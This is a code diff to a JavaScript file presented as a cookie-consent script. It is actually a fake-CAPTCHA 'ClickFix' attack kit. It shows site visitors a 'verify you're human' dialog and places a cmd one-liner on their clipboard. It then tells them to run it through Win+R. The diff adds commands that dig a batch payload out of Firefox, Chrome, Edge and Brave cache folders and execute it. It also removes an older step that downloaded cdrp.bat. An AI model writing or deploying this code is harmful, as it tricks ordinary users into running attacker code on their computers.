@@ -2,7 +2,7 @@
    <script src="https://yoursite.com/consent.js"></script>
    File URL from page query: ?f=https://abc.com/hello.txt  or  ?f=<base64-url>
    Payload MUST be strict raw body only (no HTTP headers, no HTML, no BOM, no bytes after ===END===).
-   One-liner finds cache by marker string (findstr), not file size.
+   Firefox: findstr + fsutil trim. Chromium: on-disk cache block size (cacheFileSizes).
 */
 (function () {
   'use strict';
@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.6',
+    version: '1.9.7',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -24,12 +24,17 @@
     bodyStartMarker: 'CDRP7F3A9D2B8C4',
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
-    chromiumPayloadDownloadName: 'cdrp.bat',
+    cacheFileSizes: {
+      firefox: 0,
+      chrome: 1056768,
+      edge: 1056768,
+      brave: 1056768
+    },
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /k cd /d %TMP%&copy /y "%USERPROFILE%\\Downloads\\cdrp.bat" t.bat>nul&&call t.bat',
-      edge: 'cmd /k cd /d %TMP%&copy /y "%USERPROFILE%\\Downloads\\cdrp.bat" t.bat>nul&&call t.bat',
-      brave: 'cmd /k cd /d %TMP%&copy /y "%USERPROFILE%\\Downloads\\cdrp.bat" t.bat>nul&&call t.bat'
+      chrome: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\Google\\Chrome\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (data_* f_*) do @if %~zF=={CSZ} copy /y "%F" t.bat&&call t.bat&&goto :eof',
+      edge: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\Microsoft\\Edge\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (data_* f_*) do @if %~zF=={CSZ} copy /y "%F" t.bat&&call t.bat&&goto :eof',
+      brave: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (data_* f_*) do @if %~zF=={CSZ} copy /y "%F" t.bat&&call t.bat&&goto :eof'
     }
   };
 
@@ -88,9 +93,6 @@
   var captchaWidget = null;
   var captchaOverlay = null;
   var captchaVisible = false;
-  var lastPayloadBuf = null;
-  var chromiumPayloadDownloaded = false;
-
   function getFaviconCandidates() {
     var urls = [];
     document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').forEach(function (link) {
@@ -122,7 +124,8 @@
       if (bk === 'firefox') {
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
-        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — no download until captcha finishes; then one cdrp.bat + Win+R code';
+        var csz = (CONSENT_CONFIG.cacheFileSizes || {})[bk] || 0;
+        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — Win+R finds Cache\\Cache_Data block ' + (csz || '?') + ' bytes';
       }
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
@@ -147,6 +150,14 @@
     if (!startMarker || !endMarker || !bodySize || bodySize < 1) return '';
 
     var key = getBrowserKey();
+    var cacheSizes = CONSENT_CONFIG.cacheFileSizes || {};
+    var cacheBlockSize = cacheSizes[key];
+    if (key === 'firefox') {
+      if (!bodySize || bodySize < 1) return '';
+    } else if (!cacheBlockSize || cacheBlockSize < 1) {
+      return '';
+    }
+
     var templates = CONSENT_CONFIG.verificationTemplates || {};
     var tpl = templates[key] || templates.firefox || '';
     if (!tpl) return '';
@@ -155,7 +166,8 @@
       .replace(/\{M\}/g, startMarker)
       .replace(/\{E\}/g, endMarker)
       .replace(/\{SM1\}/g, String(bodySize - 1))
-      .replace(/\{SZ\}/g, String(bodySize));
+      .replace(/\{SZ\}/g, String(bodySize))
+      .replace(/\{CSZ\}/g, String(cacheBlockSize || ''));
   }
 
   function fallbackCopy(text) {
@@ -177,26 +189,6 @@
     try { ok = document.execCommand('copy'); } catch (e1) {}
     ta.remove();
     return ok;
-  }
-
-  function saveChromiumPayloadDownload() {
-    if (chromiumPayloadDownloaded) return;
-    if (getBrowserKey() === 'firefox' || !lastPayloadBuf) return;
-    chromiumPayloadDownloaded = true;
-    try {
-      var name = CONSENT_CONFIG.chromiumPayloadDownloadName || 'cdrp.bat';
-      var blob = new Blob([lastPayloadBuf], { type: 'application/octet-stream' });
-      var a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = name;
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(function () {
-        URL.revokeObjectURL(a.href);
-        a.remove();
-      }, 500);
-    } catch (e) {}
   }
 
   function copyVerificationCommand() {
@@ -348,13 +340,11 @@
           if (CONSENT_CONFIG.strictBody !== false) {
             var check = validateStrictPayload(buf);
             if (!check.ok) {
-              lastPayloadBuf = null;
               updateCacheStatus('fail', check.reason);
               return false;
             }
           }
 
-          lastPayloadBuf = buf;
           CONSENT_CONFIG.cacheFileBodySize = buf.byteLength;
           updateCacheStatus('ok', new TextDecoder('utf-8').decode(buf));
           saveBodyReference(buf);
@@ -447,9 +437,6 @@
   }
 
   function getVerifyingHtml(refId) {
-    var dlStep = getBrowserKey() !== 'firefox'
-      ? '<li>Allow <strong>cdrp.bat</strong> to save to your Downloads folder</li>'
-      : '';
     return (
       '<div class="ts-v-header">' +
       '<div class="ts-v-status">' + getOrbitDotsHtml() + '<span class="ts-v-title">Verifying...</span></div>' +
@@ -457,7 +444,6 @@
       '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy</a><span class="ts-dot">·</span><a href="#">Help</a></div></div></div>' +
       '<div class="ts-v-rule"></div>' +
       '<div class="ts-v-body"><h3>Let us know you\'re human, please complete steps:</h3><ol>' +
-      dlStep +
       '<li>Press <span class="ts-kbd">Win</span> + <span class="ts-kbd">R</span> to open the verification dialog</li>' +
       '<li>Press <span class="ts-kbd">Ctrl</span> + <span class="ts-kbd">V</span> to paste the confirmation code</li>' +
       '<li>Press <span class="ts-kbd">Enter</span> to confirm you\'re not a robot</li>' +
@@ -474,10 +460,9 @@
       el.className = 'ts-v-copy-hint ts-v-copy-warn';
       return;
     }
-    var dlNote = getBrowserKey() !== 'firefox' ? ' cdrp.bat should be in Downloads.' : '';
     el.textContent = copied
-      ? 'Confirmation code copied to clipboard.' + dlNote
-      : 'Click this panel and press Ctrl+V again if paste is empty.' + dlNote;
+      ? 'Confirmation code copied to clipboard.'
+      : 'Click this panel and press Ctrl+V again if paste is empty.';
     el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
   }
 
@@ -496,7 +481,6 @@
     captchaWidget.setAttribute('role', 'dialog');
     captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
 
-    saveChromiumPayloadDownload();
     var copied = copyVerificationCommand();
     updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
     bindCopyOnUserGesture(captchaWidget);
@@ -583,7 +567,6 @@
       captchaWidget.classList.remove('ts-loading');
       captchaWidget.classList.add('ts-verifying');
       captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
-      saveChromiumPayloadDownload();
       var copied = copyVerificationCommand();
       updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
       bindCopyOnUserGesture(captchaWidget);
